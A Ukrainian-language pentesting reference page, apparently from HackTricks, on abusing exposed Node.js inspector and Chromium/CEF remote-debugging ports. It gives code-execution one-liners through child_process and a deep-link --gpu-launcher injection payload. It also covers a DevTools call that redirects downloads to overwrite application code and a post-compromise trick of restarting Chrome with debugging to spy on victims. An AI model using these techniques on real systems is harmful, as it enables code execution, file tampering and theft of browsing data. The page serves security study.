# Зловживання Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

[З документації](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): При запуску з перемикачем `--inspect` процес Node.js прослуховує підключення debugging client. **За замовчуванням** він прослуховує host і port **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.

Щоб підключитися, Inspector clients мають знати й указати host address, port і UUID. Повна URL-адреса матиме приблизно такий вигляд: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Оскільки **debugger має повний доступ до середовища виконання Node.js**, зловмисник, здатний підключитися до цього port, може отримати можливість виконувати довільний code від імені процесу Node.js (**потенційне підвищення привілеїв**).

Існує кілька способів запустити Inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Коли ви запускаєте процес, що перевіряється, з’явиться щось на кшталт цього:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Процесам на основі **CEF** (**Chromium Embedded Framework**) потрібно використовувати параметр: `--remote-debugging-port=9222`, щоб відкрити **debugger** (захист від **SSRF** залишається дуже схожим). Однак замість надання сеансу **debug** **NodeJS** вони взаємодіятимуть із браузером за допомогою [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/). Це інтерфейс для керування браузером, але прямого **RCE** немає.

Коли ви запускаєте браузер із увімкненим **debug**, з’явиться щось на кшталт цього:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Браузери, WebSockets і same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті у веббраузері, можуть виконувати WebSocket- і HTTP-запити відповідно до моделі безпеки браузера. **Початкове HTTP-з'єднання** необхідне, щоб **отримати унікальний ідентифікатор сеансу debugger**. **same-origin-policy** **перешкоджає** вебсайтам встановлювати **це HTTP-з'єднання**. Для додаткового захисту від [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, щоб **заголовки 'Host'** для з'єднання точно містили **IP-адресу**, **`localhost`** або **`localhost6`**.

> [!TIP]
> Ці **заходи безпеки запобігають експлуатації inspector** для виконання коду **лише надсиланням HTTP-запиту** (що можна було б зробити шляхом експлуатації SSRF vuln).

### Запуск inspector у запущених процесах

Ви можете надіслати **сигнал SIGUSR1** запущеному процесу nodejs, щоб змусити його **запустити inspector** на порту за замовчуванням. Однак зверніть увагу, що ви повинні мати достатні привілеї, тому це може надати вам **привілейований доступ до інформації всередині процесу**, але не пряме підвищення привілеїв.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Це корисно в контейнерах, оскільки **завершення процесу та запуск нового** з `--inspect` **не є варіантом**, адже **контейнер** буде **завершено** разом із процесом.

### Підключення до inspector/debugger

Для підключення до **браузера на основі Chromium** можна використовувати URL `chrome://inspect` або `edge://inspect` для Chrome або Edge відповідно. Після натискання кнопки Configure слід переконатися, що **цільові хост і порт** правильно вказані. На зображенні показано приклад Remote Code Execution (RCE):

![Після цього з’явиться URL для доступу до debugger, наприклад ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d — Підключення до inspector/debugger: Для підключення до браузера на основі Chromium,...](<../../images/image (674).png>)

За допомогою **командного рядка** можна підключитися до debugger/inspector за допомогою:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дає змогу **знаходити inspectors**, що працюють локально, і **inject code** у них.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Зверніть увагу, що **RCE-експлойти NodeJS не працюватимуть**, якщо підключитися до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (потрібно перевірити API, щоб знайти цікаві способи його використання).

## RCE у NodeJS Debugger/Inspector

> [!TIP]
> Якщо ви перейшли сюди, щоб дізнатися, як отримати [**RCE із XSS в Electron, перегляньте цю сторінку.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Деякі поширені способи отримати **RCE**, коли ви можете **підключитися** до Node **inspector**, полягають у використанні чогось на кшталт наведеного нижче (схоже, що це **не працюватиме під час підключення до Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads для Chrome DevTools Protocol

Перевірити API можна тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
У цьому розділі я лише перелічу цікаві способи, які, як я виявив, використовували для exploit цього протоколу.

### Parameter Injection через Deep Links

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) компанія Rhino Security виявила, що застосунок на базі CEF **зареєстрував власний URI** у системі (workspaces://index.html), який отримував повний URI, а потім **запускав застосунок на базі CEF** із конфігурацією, частково сформованою з цього URI.

Було виявлено, що параметри URI декодувалися як URL і використовувалися для запуску базового застосунку CEF, що дозволяло користувачу **inject** прапорець **`--gpu-launcher`** у **командний рядок** і виконувати довільні дії.

Отже, payload на кшталт:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Виконає calc.exe.

### Перезапис файлів

Змініть папку, де **зберігатимуться завантажені файли**, і завантажте файл, щоб **перезаписати** часто використовуваний **source code** застосунку своїм **malicious code**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### RCE через Webdriver та exfiltration

Згідно з цим дописом: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), можна отримати RCE та виконати exfiltration внутрішніх сторінок із theriver.

### Post-Exploitation

У реальному середовищі та **після компрометації** ПК користувача, який використовує браузер на базі Chrome/Chromium, можна запустити процес Chrome з **активованим debugging і виконати port-forward debugging-порту**, щоб отримати до нього доступ. Таким чином ви зможете **переглядати все, що жертва робить у Chrome, і викрадати конфіденційну інформацію**.

Найбільш непомітний спосіб — **завершити всі процеси Chrome**, а потім викликати щось на кшталт
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Посилання

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
